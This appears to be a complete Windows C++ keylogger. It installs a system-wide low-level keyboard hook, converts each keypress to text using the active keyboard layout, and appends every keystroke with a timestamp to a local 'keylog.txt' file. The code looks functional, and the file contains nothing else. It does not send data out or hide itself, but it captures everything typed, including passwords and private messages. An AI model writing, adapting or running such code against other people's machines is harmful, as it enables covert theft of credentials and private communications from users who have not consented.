#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <iomanip>

HHOOK g_hook = nullptr;
std::wofstream g_log;
HKL g_layout = nullptr;

// Translate virtual key to display text (printable when possible)
std::wstring VkToText(DWORD vk, KBDLLHOOKSTRUCT* pInfo) {
    // Handle some specials first
    switch (vk) {
    case VK_RETURN: return L"[Enter]";
    case VK_BACK: return L"[Back]";
    case VK_TAB: return L"[Tab]";
    case VK_ESCAPE: return L"[Esc]";
    case VK_SPACE: return L" ";
    case VK_DELETE: return L"[Del]";
    case VK_LEFT: return L"[Left]";
    case VK_RIGHT: return L"[Right]";
    case VK_UP: return L"[Up]";
    case VK_DOWN: return L"[Down]";
    }

    BYTE keystate[256];
    if (!GetKeyboardState(keystate)) {
        // Fallback to key name
        wchar_t keyName[128]{};
        // Build lParam for GetKeyNameText: bits 16–23 = scan code, bit 24 = extended
        DWORD scan = pInfo->scanCode;
        LONG lParam = (scan << 16);
        if (pInfo->flags & LLKHF_EXTENDED) lParam |= (1 << 24);
        if (GetKeyNameTextW(lParam, keyName, 128) > 0)
            return keyName;
        return L"[?]";
    }

    WCHAR buff[8];
    UINT sc = pInfo->scanCode;
    // ToUnicodeEx expects scan code, extended handled implicitly
    int rc = ToUnicodeEx(vk, sc, keystate, buff, 8, 0, g_layout);
    if (rc > 0) {
        buff[rc] = 0;
        return std::wstring(buff);
    }
    // Dead key or non printable
    wchar_t keyName[128]{};
    DWORD scan = pInfo->scanCode;
    LONG lParam = (scan << 16);
    if (pInfo->flags & LLKHF_EXTENDED) lParam |= (1 << 24);
    if (GetKeyNameTextW(lParam, keyName, 128) > 0)
        return std::wstring(L"[") + keyName + L"]";
    return L"[?]";
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto* pInfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vk = pInfo->vkCode;

        std::wstring text = VkToText(vk, pInfo);

        if (g_log.is_open()) {
            SYSTEMTIME st; GetLocalTime(&st);
            g_log << L"[" << std::setw(2) << std::setfill(L'0') << st.wHour
                  << L":" << std::setw(2) << st.wMinute
                  << L":" << std::setw(2) << st.wSecond << L"] "
                  << text << L"\n";
            g_log.flush();
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

int wmain() {
    g_layout = GetKeyboardLayout(0);

    g_log.open(L"keylog.txt", std::ios::app);
    if (!g_log) {
        std::wcerr << L"Cannot open log file\n";
        return 1;
    }

    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleW(nullptr), 0);
    if (!g_hook) {
        std::wcerr << L"Failed to install hook: " << GetLastError() << L"\n";
        return 1;
    }

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (g_hook) UnhookWindowsHookEx(g_hook);
    return 0;
}
